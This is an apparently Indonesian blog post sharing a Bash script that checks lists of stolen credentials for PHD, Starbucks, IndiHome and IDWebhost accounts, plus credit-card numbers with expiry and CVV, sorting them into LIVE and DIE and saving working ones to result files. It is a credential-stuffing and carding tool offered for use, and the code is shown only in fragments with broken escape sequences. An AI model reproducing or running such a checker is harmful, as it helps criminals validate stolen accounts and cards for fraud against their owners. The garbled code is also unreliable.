...
type to search
Home  ?  Script
Script Checker PHD, SBUX, INDIHOME, Credit Card Checker Versi Bash
 Saturday, 10 November 2018  Add Comment

Script Checker Account PHD, SBUX, INDIHOME, Credit Card Checker Versi Bash - Tools checker account ini merupakan script vershi bash checker, dimana harus menggunakan API saat proses checker. Disini saya ingin membagikan script checker dalam 1 file script yang berisi beberapa akun checker, seperti:

1. PHD-Account Checker
2. SBUX-Account Checker
3. INDIHOME-Account Checker
4. IDWEBHOST-Account Checker
5. Credit-Card Checker [FastCheck]
...
phd(){
    ...
    if [[ ! $livena =~ "DIE" ]]; then
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2n"
    echo "$1|$2" >> resultphd.txt
    else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2${NC}n"
fi
}
sbux(){
...
ccchecker(){
    ...
    if [[ ! $livena =~ "card_declined" ]]; then
        printf "n${HIJAU}[LIVE] $1|$2|$3|$4 [$bincc/$scheme1-$typena1] [$waktu]n";
...
echo "$list No Such File"
    ...
    IFS=$'rn' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'rn' GLOBIGNORE='*' command eval  'passwordna=($y)'
...
exit
    ...
    IFS=$'rn' GLOBIGNORE='*' command eval  'ccnum=($x)'
    IFS=$'rn' GLOBIGNORE='*' command eval  'exp1=($y)'
    IFS=$'rn' GLOBIGNORE='*' command eval  'exp2=($z)'
    IFS=$'rn' GLOBIGNORE='*' command eval  'ccv=($h)'
